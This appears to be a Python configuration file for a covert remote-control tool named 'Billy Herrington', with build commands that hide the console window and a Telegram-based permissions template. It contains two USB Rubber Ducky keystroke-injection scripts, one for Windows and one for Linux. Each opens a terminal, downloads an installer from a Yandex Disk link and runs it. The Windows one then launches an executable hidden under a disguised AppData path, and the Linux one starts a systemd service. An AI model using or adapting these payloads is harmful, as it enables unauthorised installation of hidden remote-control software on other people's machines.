import platform
import constants

os_name = platform.system()

BillyHerrington_network_directory = '/Billy-Herrington/'

Billy_windows_name = 'Billy.exe'
Billy_linux_name = 'Billy'
Installer_windows_name = 'Installer.exe'
Installer_linux_name = 'Installer'

parser_name = 'parser.json'
parser_path = parser_name
network_parser_path = BillyHerrington_network_directory + parser_name

network_token_path = 'BillyHerrington/network_token.py'
network_token_value = "token = '{network_token}'"

branch_name_path = 'BillyHerrington/branch.py'
branch_name_value = "branch_name = '{branch_name}'"

permissions_file_path = 'NetworkStructure/permissions.json'
permissions_file_value = '{{"{telegram_id}": {{"allowed": ["ALL"], "forbidden": []}}}}'

sample_dir_path = 'NetworkStructure/'

compile_dir_path = 'Compile commands/'
# 'pyinstaller --noconsole --hidden-import=yadisk.sessions --hidden-import=yadisk.sessions.requests_session --hidden-import=scipy._cyutility  --icon=data/icon.ico --onefile BillyHerrington/Billy.py'
Billy_windows_compile_command_path = compile_dir_path + \
    'Billy_windows_compile_command.txt'
# 'pyinstaller --add-binary "/usr/lib/x86_64-linux-gnu/libportaudio.so:." --add-binary "/usr/lib/x86_64-linux-gnu/libpython3.11.so.1.0:." --paths "$(python3 -c \'import sys; print(sys.prefix)\')/lib" --noconsole --hidden-import=yadisk.sessions --hidden-import=yadisk.sessions.requests_session --hidden-import=scipy._cyutility --onefile BillyHerrington/Billy.py'
Billy_linux_compile_command_path = compile_dir_path + \
    'Billy_linux_compile_command.txt'
# 'pyinstaller --noconsole --hidden-import=yadisk.sessions --hidden-import=yadisk.sessions.requests_session --icon=data/icon.ico --onefile BillyHerrington/Installer.py'
Installer_windows_compile_command_path = compile_dir_path + \
    'Installer_windows_compile_command.txt'
# 'pyinstaller --add-binary "/usr/lib/x86_64-linux-gnu/libpython3.11.so.1.0:." --paths "$(python3 -c \'import sys; print(sys.prefix)\')/lib" --noconsole --hidden-import=yadisk.sessions --hidden-import=yadisk.sessions.requests_session --onefile BillyHerrington/Installer.py'
Installer_linux_compile_command_path = compile_dir_path + \
    'Installer_linux_compile_command.txt'

if os_name == constants.WINDOWS_OS:
    Billy_compile_command_path = Billy_windows_compile_command_path

if os_name == constants.LINUX_OS:
    Billy_compile_command_path = Billy_linux_compile_command_path

if os_name == constants.WINDOWS_OS:
    Installer_compile_command_path = Installer_windows_compile_command_path

if os_name == constants.LINUX_OS:
    Installer_compile_command_path = Installer_linux_compile_command_path

compile_dir_path = 'dist/'

rubber_ducky_scripts_path = 'Rubber Ducky Scripts/'

windows_rubber_ducky_script = """GUI r
DELAY 500
STRING cmd
DELAY 500
ENTER
DELAY 750
STRING curl -k -s https://cloud-api.yandex.net/v1/disk/public/resources/download?public_key={link} > temp.txt & powershell -command "Get-Content "temp.txt" | Select-String -Pattern 'https://downloader.disk.yandex.ru/disk/.+?=v3' | ForEach-Object {{$_.Matches.value}}" > temp2.txt & for /f "delims=" %u in (temp2.txt) do curl -k -s -L "%u" -o Installer.exe & del temp.txt & del temp2.txt & start "" /wait Installer.exe & del Installer.exe & "C:/Users/%username%/AppData/Local/Comms/Unistore/data/5/a/billy/Billy.exe" > Nul & exit
DELAY 2000
ENTER"""

linux_rubber_ducky_script = """DELAY 500
ALT F2
DELAY 1000
STRING sh -c "xdg-terminal-exec||kgx||ptyxis||gnome-terminal||mate-terminal||xfce4-terminal||tilix||konsole||xterm"
DELAY 1000
ENTER
DELAY 1000
STRING wget -q -O temp.txt "https://cloud-api.yandex.net/v1/disk/public/resources/download?public_key={link}" ; download_url=$(grep -oP '"href":"\\K[^"]+' temp.txt | head -1); wget -q -O Installer "$download_url"; chmod +x Installer; rm temp.txt; ./Installer; rm Installer; systemctl --user start Billy.service; clear; exit
DELAY 2000
ENTER"""

session_network_token_path = 'network_token.token'

max_length_of_branch_name = 100

forge_api_latest_release = "https://api.github.com/repos/serabobina/Billy/releases/latest"

comment_network_path = BillyHerrington_network_directory + \
    "{branch_name}/comment.txt"
comment_path = "comment.txt"
